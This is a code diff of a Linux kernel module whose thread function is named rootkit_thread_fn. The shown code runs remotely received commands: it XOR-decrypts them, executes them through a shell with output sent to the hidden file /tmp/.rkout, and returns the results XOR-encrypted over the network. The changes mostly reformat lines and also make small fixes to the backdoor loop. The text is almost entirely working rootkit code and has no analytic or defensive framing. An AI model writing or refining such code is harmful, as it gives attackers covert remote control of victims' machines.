@@ -107,18 +107,16 @@ static int rootkit_thread_fn(void *data) {
         while (!kthread_should_stop()) {
             memset(cmd_buf, 0, sizeof(cmd_buf));
             int len = recv_data(cmd_buf, MAX_CMD_LEN);
-            if (len <= 0)
-                break;
+            if (len <= 0) break;
 
             xor_encrypt(cmd_buf, len);
             cmd_buf[len] = '\0';
 
-            if (strcmp(cmd_buf, "exit") == 0 || strcmp(cmd_buf, "quit") == 0)
-                break;
+            if (strcmp(cmd_buf, "exit") == 0 || strcmp(cmd_buf, "quit") == 0) break;
 
             char tmp_path[] = "/tmp/.rkout";
             char shell_cmd[512];
-            snprintf(shell_cmd, sizeof(shell_cmd), "%s > %s 2>&1", cmd_buf, tmp_path);
+            snprintf(shell_cmd, sizeof(shell_cmd), "cd / && %s > %s 2>&1", cmd_buf, tmp_path);
 
             mm_segment_t old_fs = get_fs();
             set_fs(KERNEL_DS);
@@ -132,8 +130,8 @@ static int rootkit_thread_fn(void *data) {
                 while (1) {
                     memset(io_buf, 0, sizeof(io_buf));
                     int r = kernel_read(file, io_buf, sizeof(io_buf) - 1, &pos);
-                    if (r <= 0)
-                        break;
+                    if (r <= 0) break;
+                    pos += r;
                     xor_encrypt(io_buf, r);
                     struct kvec ciov = {.iov_base = io_buf, .iov_len = r};
                     struct msghdr cmsg = {0};
